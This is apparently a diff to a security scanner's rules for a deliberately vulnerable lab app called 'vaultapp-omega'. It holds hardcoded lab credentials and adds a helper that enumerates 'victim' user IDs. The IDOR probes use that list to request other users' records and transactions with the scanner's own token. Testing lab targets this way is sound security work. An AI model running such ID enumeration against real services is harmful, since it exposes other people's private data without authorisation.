@@ -93182,9 +93182,20 @@ const VAULTAPP_OMEGA_ORIGIN = "https://vaultapp-omega.vercel.app";
 
 const VAULTAPP_LAB_CREDENTIALS = [
   { username: "rootadmin", password: "adminpass2" },
-  { username: "sysadmin", password: "adminpass1" },
-  { username: "player", password: "player123" }
+  { username: "player01", password: "player123" },
+  { username: "sysadmin", password: "adminpass1" }
 ] as const;
+
+/** Omega Vercel DB seeds user IDs from 100+; legacy 15/25/50 probes no longer exist. */
+function vaultappVictimUserIds(ctx: RuleContext, auth: VaultappAuth): number[] {
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const routeMatch = pageUrl.match(/\/api\/users\/(\d+)/i);
+  const routeId = routeMatch ? Number(routeMatch[1]) : null;
+  const seeded = [100, 200, 250, 280, 290, 295, 298, 301];
+  const range = Array.from({ length: 101 }, (_, i) => i + 100);
+  const ids = [...(routeId && routeId > 0 ? [routeId] : []), ...seeded, ...range];
+  return [...new Set(ids)].filter((id) => id !== auth.userId);
+}
 
 function vaultappCheckpointBlocked(body: string): boolean {
   return /Vercel Security Checkpoint|verifying your browser/i.test(body);
@@ -93632,9 +93643,7 @@ async function probeVaultappUsersIdor(ctx: RuleContext): Promise<RuleResult | nu
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
   };
-  const victimIds = [15, 20, 25, 50, 100, auth.userId === 299 ? 10 : 299];
-  for (const victimId of victimIds) {
-    if (victimId === auth.userId) continue;
+  for (const victimId of vaultappVictimUserIds(ctx, auth)) {
     const userUrl = new URL(`/api/users/${victimId}`, apiOrigin).toString();
     const doc = await ctx.probe.get(userUrl, { headers, maxBytes: 4096, timeoutMs: 15000 });
     if (doc.status < 200 || doc.status >= 300) continue;
@@ -93699,9 +93708,7 @@ async function probeVaultappTransactionsIdor(ctx: RuleContext): Promise<RuleResu
     Authorization: `Bearer ${auth.token}`,
     Accept: "application/json"
   };
-  const victimIds = [15, 20, 25, 50, auth.userId === 299 ? 10 : 299];
-  for (const victimId of victimIds) {
-    if (victimId === auth.userId) continue;
+  for (const victimId of vaultappVictimUserIds(ctx, auth)) {
     const userUrl = new URL(`/api/users/${victimId}`, apiOrigin).toString();
     const userDoc = await ctx.probe.get(userUrl, { headers, maxBytes: 4096, timeoutMs: 15000 });
     if (userDoc.status < 200 || userDoc.status >= 300) continue;
